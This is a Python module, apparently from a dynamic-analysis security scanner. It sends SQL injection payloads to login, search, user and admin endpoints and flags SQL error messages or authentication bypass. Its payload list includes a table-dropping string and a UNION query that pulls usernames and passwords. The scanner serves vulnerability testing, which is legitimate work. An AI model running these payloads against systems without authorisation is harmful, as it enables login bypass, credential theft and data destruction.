"""
SQL Injection vulnerability testing for the Dynamic Analysis Agent.
"""

import requests
from urllib.parse import urljoin

def test_sql_injection(base_url):
    """
    Test for SQL injection vulnerabilities.

    Args:
        base_url (str): Base URL to test

    Returns:
        list: List of detected vulnerabilities
    """
    vulnerabilities = []

    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin' --",
        "' UNION SELECT NULL --",
        "' UNION SELECT username, password FROM users --",
        "'; DROP TABLE users --",
        "' OR ''='",
        "1' ORDER BY 1 --",
        "1' ORDER BY 2 --",
        "' AND 1=0 UNION SELECT database() --",
        "' AND 1=0 UNION SELECT table_name FROM information_schema.tables --"
    ]

    test_endpoints = [
        urljoin(base_url, "/login"),
        urljoin(base_url, "/search"),
        urljoin(base_url, "/api/search"),
        urljoin(base_url, "/user"),
        urljoin(base_url, "/admin")
    ]

    for endpoint in test_endpoints:
        for payload in sql_payloads:
            try:
                # Test in query parameters
                params = {"q": payload, "search": payload, "username": payload, "id": payload}
                response = requests.get(endpoint, params=params, timeout=5)

                # Check for SQL error patterns
                error_patterns = [
                    "sql syntax", "mysql error", "postgresql error", "sqlite error",
                    "ora-", "sqlserver", "syntax error", "unclosed quotation mark",
                    "you have an error in your sql syntax"
                ]

                response_text = response.text.lower()
                if any(pattern in response_text for pattern in error_patterns):
                    vulnerabilities.append({
                        "type": "SQL Injection",
                        "endpoint": endpoint,
                        "payload": payload,
                        "method": "GET",
                        "evidence": "SQL error pattern detected"
                    })

                # Test in POST data for login forms - check for authentication bypass
                if "login" in endpoint:
                    data = {"username": payload, "password": "test", "email": payload}
                    response = requests.post(endpoint, data=data, timeout=5)

                    # Check for SQL errors
                    if any(pattern in response.text.lower() for pattern in error_patterns):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "endpoint": endpoint,
                            "payload": payload,
                            "method": "POST",
                            "evidence": "SQL error pattern detected"
                        })
                    # Check for authentication bypass (successful login with injection)
                    elif response.status_code == 200 and ("welcome" in response.text.lower() or "logged in" in response.text.lower()):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "endpoint": endpoint,
                            "payload": payload,
                            "method": "POST",
                            "evidence": "Authentication bypass successful"
                        })

            except requests.RequestException:
                continue

    return vulnerabilities
